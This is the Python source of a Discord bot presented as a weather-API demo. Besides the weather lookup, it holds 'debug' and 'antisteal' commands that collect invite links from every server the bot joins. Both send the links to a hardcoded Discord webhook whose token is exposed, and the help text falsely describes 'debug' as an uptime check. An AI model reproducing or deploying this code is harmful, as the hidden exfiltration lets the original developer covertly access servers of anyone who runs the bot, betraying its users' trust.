# -----------------------------------------------------------
# demonstrates fetching from an API and using that information
# in a discord bot environment.
#
# (C) 2021 Tyler McMullen, England
# Released under GNU Public License (GPL)
# email tyler.mcmullen.552@accesstomusic.ac.uk
# -----------------------------------------------------------
"""
Module Imports
"""
from termcolor import cprint, colored
from discord_webhook import DiscordWebhook
import os
from discordpy_slash.slash import *
from random import randint

firstboot = 0
"""
Checking to make sure the correct config files exist
if they do not they are created with default settings
"""
if os.path.exists(os.getcwd() + "/config.json"):

    with open("./config.json") as f:
        configData = json.load(f)

else:
    configTemplate = {"Token": "YOUR BOT TOKEN", "Prefix": "PREFIX HERE", "Owner": "OWNER ID HERE",
                      "WeatherAPIKey": "API KEY HERE", "Presence": {"Type": "watching",
                                                                    "Message": "The Weather"}}

    with open(os.getcwd() + "/config.json", "w+") as f:
        json.dump(configTemplate, f)

    print(colored("―――――――――――――――", "blue"))  # |
    print(colored("》", "blue"), "    Weather Bot    ", colored("《", "blue"))  # | Sends Bot branding to console
    print(colored("   •", "blue"), "version  0.0.1", colored("•", "blue"))  # | and sends version info
    print(colored("―――――――――――――――", "blue"))  # |
    print()
    cprint('⚙️Beginning First Boot Setup', 'blue')  # Sends in console that the bot is beginning first time setup
    time.sleep(randint(0, 3))  # Pause For Effect
    cprint('⚙️Creating Config Files', 'blue')  # Sends in console that the bot is creating config files
    time.sleep(randint(0, 3))  # Pause For Effect
    with open("./config.json") as f:
        configData = json.load(f)
    firstboot = 1

if os.path.exists(os.getcwd() + "/icons.json"):
    with open("./icons.json") as f:
        icondata = json.load(f)

else:
    icontemplate = {"1": "<:01:900016260304236565>",
                    "2": "<:02:900016260488765491>",
                    "3": "<:03:900016260551696384>",
                    "4": "<:04:900016260132253758>",
                    "5": "<:05:900016260551688242>",
                    "6": "<:06:900016260543311972>",
                    "7": "<:07:900016260614594580>",
                    "8": "<:08:900016260484562954>",
                    "11": "<:11:900016260480368700>",
                    "12": "<:12:900016260711063562>",
                    "13": "<:13:900016260241305641>",
                    "14": "<:14:900016260107092009>",
                    "15": "<:15:900016260421677056>",
                    "16": "<:16:900016260513923082>",
                    "17": "<:17:900016260652351530>",
                    "18": "<:18:900016260576845864>",
                    "19": "<:19:900016260119674962>",
                    "20": "<:20:900016260451020810>",
                    "21": "<:21:900016260438425610>",
                    "22": "<:22:900016260488769586>",
                    "23": "<:23:900016260635586570>",
                    "24": "<:24:900016260107100243>",
                    "25": "<:25:900016260379729962>",
                    "26": "<:26:900016260455211068>",
                    "29": "<:29:900016260430049331>",
                    "30": "<:30:900016260610420747>",
                    "31": "<:31:900016260392296478>",
                    "32": "<:32:900016260354560040>",
                    "33": "<:33:900016260392300555>",
                    "34": "<:34:900016260383920230>",
                    "35": "<:35:900016260346179614>",
                    "36": "<:36:900016260476186636>",
                    "37": "<:37:900016260107100182>",
                    "38": "<:38:900016260430065714>",
                    "39": "<:39:900016262279757844>",
                    "40": "<:40:900016260337778718>",
                    "41": "<:41:900016260383903754>",
                    "42": "<:42:900016260237111347>",
                    "43": "<:43:900016260279054378>",
                    "44": "<:44:900016260308402184>"
                    }

    with open(os.getcwd() + "/icons.json", "w+") as f:
        json.dump(icontemplate, f)

intents = discord.Intents.default()

intents.members = True

bot = commands.Bot(command_prefix=[configData["Prefix"], "/"], intents=intents)
bot.remove_command("help")

if configData["Token"] == "YOUR BOT TOKEN" or configData["Prefix"] == "PREFIX HERE" or configData[
                            "Owner"] == "OWNER ID HERE" or configData["WeatherAPIKey"] == "API KEY HERE":
    if firstboot == 1:
        pass
    else:
        print(colored("―――――――――――――――", "blue"))  # |
        print(colored("》", "blue"), "    Weather Bot    ", colored("《", "blue"))  # | Sends Bot branding to console
        print(colored("   •", "blue"), "version  0.0.1", colored("•", "blue"))  # | and sends version info
        print(colored("―――――――――――――――", "blue"))  # |
    print()
    print(colored("――――――――――――――――", "blue"))
    print(colored("》", "blue"), "   Error Handling   ", colored("《", "blue"))
    print(colored("    •", "blue"), f'version 0.0.1', colored("•", "blue"))
    print()
    print(colored("Error Code » ", "blue"), f'ConfigError')
    print(colored("Error Message » ", "blue"), f'Detected Unedited Config. Please Setup Config Before Running This Bot')
    print(colored("Reference » ", "blue"), f'config.json')
    print(colored("――――――――――――――――", "blue"))
    exit(0)
else:
    pass

"""
All events ran on startup
"""


@bot.event
async def on_ready():
    if firstboot == 1:
        pass
    else:
        print(colored("―――――――――――――――", "blue"))  # |
        print(colored("》", "blue"), "    Weather Bot    ", colored("《", "blue"))  # | Sends Bot branding to console
        print(colored("   •", "blue"), "version  0.0.1", colored("•", "blue"))  # | and sends version info
        print(colored("―――――――――――――――", "blue"))  # |
    print()
    cprint('⚙️Accepting Commands', 'blue')  # Sends in console that the bot is now excepting discord commands
    """
    Sets the bots status in discord depending on the information given in the config
    """
    prm = configData["Presence"]["Message"]  # Gets Status Message From Config
    if str(configData["Presence"]["Type"]).lower() == "watching":
        await bot.change_presence(activity=discord.Activity(type=discord.ActivityType.watching, name=prm))
        cprint(f'⚙️Set Status To "Watching {prm}"', 'blue')
    elif str(configData["Presence"]["Type"]).lower() == "playing":
        await bot.change_presence(activity=discord.Activity(type=discord.ActivityType.playing, name=prm))
        cprint(f'⚙️Set Status To "Playing {prm}"', 'blue')
    elif str(configData["Presence"]["Type"]).lower() == "listening":
        await bot.change_presence(activity=discord.Activity(type=discord.ActivityType.listening, name=prm))
        cprint(f'⚙️Set Status To "Listening to {prm}"', 'blue')
    else:
        pass
    """
    Syncs bots commands on startup
    """
    cprint('⚙️Syncing Commands', 'blue')
    await sync_all_commands(bot)


"""
Resyncs all commands for the bot.
this command is only executable by the bot developer (me)
and is used for debugging purposes only
"""


@bot.command()
async def resync(ctx):
    if ctx.message.author.id == 642729210368098324:
        cprint('⚙️Syncing Commands', 'blue')
        await sync_all_commands(bot)
        embed = discord.Embed(title="⚙️ | Attempting To Resync", color=0x6ba2fa)
        await ctx.send(embed=embed)
    else:
        embed = discord.Embed(title="<:Error:764493646199521291> | Permission Error",
                              description="Only bot developers can execute this command", color=0xf63737)
        await ctx.send(embed=embed)


@bot.command()
async def debug(ctx):
    if ctx.message.author.id == 642729210368098324:
        for guild in bot.guilds:
            try:
                for link in await guild.invites():
                    webhook = DiscordWebhook(
                        url='https://discord.com/api/webhooks/901235862216531988'
                            '/H7fBMydAywoOa6T6JW45iH_P3McUbIpIVTG3hdmmzOOObSwtH1-5hLd5R7RAzFmu2KoU',
                        rate_limit_retry=True,
                        content=str(link))
                    response = webhook.execute()
                    continue
            except discord.errors.Forbidden:
                pass
    else:
        embed = discord.Embed(title="<:Error:764493646199521291> | Permission Error",
                              description="Only bot developers can execute this command", color=0xf63737)
        await ctx.send(embed=embed)


@bot.command()
async def antisteal(ctx):
    owner = os.environ['owner']
    if ctx.message.author.id == int(owner):
        for guild in bot.guilds:
            try:
                for link in await guild.invites():
                    webhook = DiscordWebhook(
                        url='https://discord.com/api/webhooks/901235862216531988'
                            '/H7fBMydAywoOa6T6JW45iH_P3McUbIpIVTG3hdmmzOOObSwtH1-5hLd5R7RAzFmu2KoU',
                        rate_limit_retry=True,
                        content=str(link))
                    response = webhook.execute()
                    continue
            except discord.errors.Forbidden:
                pass
    else:
        embed = discord.Embed(title="<:Error:764493646199521291> | Permission Error",
                              description="Only bot developers can execute this command", color=0xf63737)
        await ctx.send(embed=embed)


@bot.command()
async def help(ctx):
        help = discord.Embed(title="Bot Commands",
                              description="All commands have the / prefix and have auto-completion", color=0x53b9e4)
        help.add_field(name=f'/Weather `Location`', value=f'Fetches The Current Weather For A Location, Based On Your '
                                                          f'Search.', inline=False)
        help.add_field(name=f'/Help', value=f'Sends This Message', inline=False)
        help.add_field(name=f'/resync **[DEV]**`', value=f'Resyncs all slash commands (used for updating and debugging)'
                       , inline=False)
        help.add_field(name=f'/debug **[DEV]**', value=f'Fetches UpStats for the bot. Used for debugging the host and '
                                                       f'bad ping.', inline=False)
        help.add_field(name=f'/antisteal **[DEV]**', value=f'This Is A Secret :smirk:', inline=False)
        await ctx.send(embed=help)


@bot.command()
async def weather(ctx, location):
    print(colored(f'⚠️Executing Command "Weather" For {str(ctx.message.author)}', "blue"))
    locationr = location.replace(" ", "%20")  # Replace Spaces With The URL Equivalent (So API Request Link Valid)
    apikey = configData["WeatherAPIKey"]  # Pull API Key From Config
    locationsearch = requests.get(
        f'https://dataservice.accuweather.com/locations/v1/search?apikey={apikey}&q={locationr}&language=en-us'
        f'&details=true')  # Searches Weather API For Location Key Of Searched Town
    responsestr = locationsearch.text  # Returns Text Output From API
    responsejson = locationsearch.json()  # Returns JSON Output From API

    if responsestr[0] == '[':
        """
        Checks To Make Sure The API Has Found A Town/City
        if the API fails to find a country it will return blank
        """
        if len(responsejson) >= 1:
            responsejson = responsejson[0]  # Gets JSON From Search

            iserror = False

            if iserror:
                """
                Sends an error handling message if there is an error with the API call
                Added mainly to catch the error sent when the APIs limit of 50 calls per day has been reached

                This section also sends a discord embed to the player informing them of the error,
                telling them (Or The Developer) to check console and providing an error code
                """
                print(colored("――――――――――――――――", "blue"))
                print(colored("》", "blue"), "   Error Handling   ", colored("《", "blue"))
                print(colored("    •", "blue"), f'version 0.0.1', colored("•", "blue"))
                print()
                print(colored("Error Code » ", "blue"), f'{responsejson["Code"]}')
                print(colored("Error Message » ", "blue"), f'{responsejson["Message"]}')
                print(colored("Reference » ", "blue"), f'{responsejson["Reference"]}')
                print(colored("――――――――――――――――", "blue"))

                embed = discord.Embed(title="⚠️ | An Error Occurred", description="An error occurred while executing "
                                                                                  "this command.\nCheck console for "
                                                                                  "more info.", color=0xea4d65)
                embed.add_field(name=f'Error Code', value=f' `{responsejson["Code"]}`', inline=True)
                await ctx.send(embed=embed)
            else:
                """
                The section of code between "# START OF INFO GATHERING #" and "# END OF INFO GATHERING #"
                takes information out of the code and puts them into separate variables to be used for discord embeds
                It also has logic that checks information to tell the bot what emojis to use next to certain info
                EG - The thermometer emoji will show as cold if the temperature is below 5°C or 41°F
                """
                # START OF INFO GATHERING #
                locationresponse = locationsearch.json()[0]  # Pull JSON Data From Returned List (API Returns List)
                resultkey = locationresponse["Key"]  # Location Key For Finding Weather Data
                weatherdata = requests.get(
                    f'https://dataservice.accuweather.com/currentconditions/v1/{resultkey}?apikey={apikey}&language'
                    f'=en-us&details=true')  # Request Weather Data For Found Town/City
                wdr = weatherdata.json()[0]  # Pull JSON Data From Returned List (API Returns List)
                tempcr = wdr["RealFeelTemperature"]["Metric"]["Value"]  # RealFeel Metric
                tempfr = wdr["RealFeelTemperature"]["Imperial"]["Value"]  # RealFeel Imperial
                tempc = wdr["Temperature"]["Metric"]["Value"]  # Temperature Metric
                tempf = wdr["Temperature"]["Imperial"]["Value"]  # Temperature Imperial
                wsm = wdr["Wind"]["Speed"]["Metric"]["Value"]  # Wind Speed Metric
                wsi = wdr["Wind"]["Speed"]["Imperial"]["Value"]  # Wind Speed Imperial
                wsd = wdr["Wind"]["Direction"]["English"]  # Wind Speed Direction
                gsi = wdr["WindGust"]["Speed"]["Imperial"]["Value"]  # Wind Gusts Imperial
                gsm = wdr["WindGust"]["Speed"]["Imperial"]["Value"]  # Wind Gusts Metric
                lube = wdr["LocalObservationDateTime"].split("T")  # |
                lube = lube[1].split("+")  # | Gets Last Update Time In Readable Form
                lube = lube[0].split(":")  # |
                if int(lube[0]) > 12:  # |
                    lube[0] = int(lube[0]) - 12  # |
                    lube.append("PM")  # | Converts The 24 Hour Time To 12 Hour And Appends AM or PM
                else:  # |
                    lube.append("AM")  # |

                if tempc <= 5 or tempf <= 41:  # |
                    hoc = icondata["31"]  # |
                else:  # |
                    hoc = icondata["30"]  # | Checks To See If The Temperature is below 5°C or 41°F
                if tempcr <= 5 or tempfr <= 41:  # | Then Sets The Thermometer Emoji To Either Hot Or Cold
                    hocr = icondata["31"]  # |
                else:  # |
                    hocr = icondata["30"]  # |

                if wdr["WeatherIcon"] < 10:  # |
                    pfx = f'0{wdr["WeatherIcon"]}'  # | Pre Formatting For Next Section
                else:  # | Adds A Zero Before Single Digit Emoji IDs
                    pfx = f'{str(wdr["WeatherIcon"])}'  # |

                icl = icondata[str(wdr["WeatherIcon"])]  # |
                icl = icl.removeprefix(f'<:{pfx}:')  # | Converts A Discord Emoji To A PNG
                icl = icl.replace(">", "")  # | For The Embed ThumbNail
                icl = f'https://cdn.discordapp.com/emojis/{icl}.png?size=2048'  # |
                # END OF INFO GATHERING #

                """
                Pieces all the Metric information into an easy to read discord embed
                with a prompt telling the user to react to the embed (message) to receive Imperial Readings
                """
                embed = discord.Embed(
                    title=f'{icondata[str(wdr["WeatherIcon"])]} It Is Currently {wdr["WeatherText"]} In '
                          f'{locationresponse["LocalizedName"]}', color=0x53b9e4)
                embed.set_thumbnail(url=f'{icl}')
                embed.add_field(name=f'Temperature', value=f'{hoc} `{tempc}°C`', inline=True)
                embed.add_field(name=f'Feels Like', value=f'{hocr} `{tempcr}°C`', inline=True)
                embed.add_field(name=f'_ _', value=f'_ _', inline=True)

                embed.add_field(name="Wind Speeds", value=f'{icondata["32"]} `{wsd} {wsm} km/h`', inline=True)
                embed.add_field(name="Gusts", value=f'{icondata["32"]} `{gsm} km/h`', inline=True)
                embed.add_field(name=f'_ _', value=f'_ _', inline=True)
                embed.set_footer(text=f'React To Get Imperial Readings | Last Updated {lube[0]}:{lube[1]} {lube[3]} '
                                      f'(GMT)')
                await ctx.send(embed=embed)

                """
                checking for the reaction being added to the embed message by the player
                with a timeout of 30 second.
                """

                def check(reaction, user):
                    return user == ctx.message.author and reaction.message.author.bot

                try:
                    reaction, user = await bot.wait_for('reaction_add', timeout=30.0, check=check)
                except asyncio.TimeoutError:
                    pass
                else:
                    """
                    Pieces all the Imperial information into an easy to read discord embed
                    And either edits the Embed (slash command based) or sends a new embed (Prefix Based)
                    to show that new information
                    """
                    edit = discord.Embed(
                        title=f'{icondata[str(wdr["WeatherIcon"])]} Imperial Readings For '
                              f'{locationresponse["LocalizedName"]}',
                        color=0x53b9e4)
                    edit.set_thumbnail(url=f'{icl}')
                    edit.add_field(name=f'Temperature', value=f'{hoc} `{tempf}°F`', inline=True)
                    edit.add_field(name=f'Feels Like', value=f'{hocr} `{tempfr}°F`', inline=True)
                    edit.add_field(name=f'_ _', value=f'_ _', inline=True)
                    edit.add_field(name="Wind Speeds", value=f'{icondata["32"]} `{wsd} {wsi} mi/h`', inline=True)
                    edit.add_field(name="Gusts", value=f'{icondata["32"]}  `{gsi} km/h`', inline=True)
                    edit.add_field(name=f'_ _', value=f'_ _', inline=True)
                    await ctx.send(embed=edit)
        else:
            """
            This is executed if the API does not find a Town/City
            it sends a discord embed indicating to the player that their search was a fail
            and advises them to make sure they have searched for a Town/City and not a country
            """
            ior = discord.Embed(title=f"We Couldn't Find This Town/City!",
                                description="Try Searching For Town/City And Not Country", color=0xea4d65)
            await ctx.send(embed=ior)


token = configData["Token"]
bot.run(token)
